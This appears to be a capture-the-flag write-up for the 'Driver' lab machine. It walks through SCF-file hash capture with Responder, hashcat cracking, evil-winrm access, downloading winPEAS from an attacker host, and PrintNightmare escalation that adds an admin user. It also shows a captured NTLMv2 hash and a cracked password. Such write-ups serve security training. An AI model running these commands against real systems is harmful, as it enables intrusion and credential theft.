# Driver

* Found port 80, 445 and 135 open

* Going into port 80 asks for user and password, using `admin:admin` i was able to login

* After a while i couldnt find anything special 

* Doing another nmap scan now using -p- for all ports I found port 5985 open so winrm is enabled but this is like ssh for windows

* The page is saying someone will open our upload and check if that file is a valid firmware, so I could upload a rev shell and wait for someone to open it

* First thing I tried was to create a msfvenom rev shell and listen with msfconsole using this https://johndcyber.com/how-to-create-a-reverse-tcp-shell-windows-executable-using-metasploit-56d049007047 but I was not able to make it work

* Next i found this  article https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ about smb - scf file attacks and this worked using responder

```bash
[SMB] NTLMv2 Client   : ::ffff:10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:375a0a4db7aa49b5:F87C06F5B9B0BD7B27ABB82DE2398605:0101000000000000E992ED959223D801498ECE8530A17A7800000000020000000000000000000000
```

* So after using `hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt` I could crack the hash to `tony:liltony`

* Using smbmap I got the next output

```bash
smbmap -u Tony -p liltony -d workgroup -H 10.10.11.106
[+] IP: 10.10.11.106:445        Name: 10.10.11.106
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC

```

* So moving to winrm, I logged in using `evil-winrm -i 10.10.11.106 -u Tony -p liltony` and got user.txt

* Downloading winpeas from windows `Invoke-WebRequest "http://10.10.14.130:8000/winPEASx64.exe" -OutFile winpeas.exe`

* winpeas got nothing so I tried using `ps` to list processes and since we are talking about printers, lets check print nightmare

![image](https://user-images.githubusercontent.com/12052283/154322227-51f74b21-d594-48bc-8995-23dda03508ef.png)

* https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html

* So doing the following steps i was able to get root.txt

* In the host machine

```bash
cd /opt/
git clone https://github.com/calebstewart/CVE-2021-1675
mv CVE-2021-1675 invoke-nightmare
```

* In the evil-winrm shell

```bash
upload /opt/invoke-nightmare/CVE-2021-1675.ps1
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "brun0" -NewPassword "test"
```

* Again in the host machine

```bash
evil-winrm -i 10.10.10.149 -u brun0 -p test
```